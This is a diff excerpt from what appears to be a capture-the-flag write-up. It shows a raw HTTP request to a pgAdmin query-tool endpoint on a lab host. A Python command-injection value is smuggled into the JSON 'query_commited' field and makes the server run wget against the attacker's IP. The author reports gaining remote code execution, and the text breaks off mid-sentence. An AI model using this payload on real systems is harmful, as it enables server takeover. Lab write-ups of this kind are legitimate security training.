@@ -301,6 +301,29 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 So ill start up a wabserver
 
 ```python
+POST /sqleditor/query_tool/download/7415033 HTTP/1.1
+Host: db-mgmt05.fries.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+X-pgA-CSRFToken: IjQ1OTg1YTk5YmFhNjY1YzhkOGRmZGMxMGZjOTY1NzAxZTllYmY0NDQi.aoPIcg.zoMzAupIL0QmZYOR2pIyQeOUgSE
+Content-Length: 60
+Origin: http://db-mgmt05.fries.htb
+Connection: keep-alive
+Referer: http://db-mgmt05.fries.htb/sqleditor/panel/7415033?is_query_tool=true&sgid=2&sid=2&did=16409&database_name=gitea
+Cookie: pga4_session=bc8d3959-2ea9-4cdb-8e13-b5f79457ce5d!8NkQJMfKNMvE0AoFGQCbSfE/gqzOrSkBxsD5B2GNjkY=; PGADMIN_LANGUAGE=en
+Priority: u=0
 
+{"filename":"data-1786996252089.csv","query_commited":"__import__('os').system('wget http://10.10.14.61/test.txt')"}
 ```
+
+Then send the following request
+
+![](Pasted%20image%2020260817205256.png)
+
+I have RCE
+
+And after some testing, it doew
 
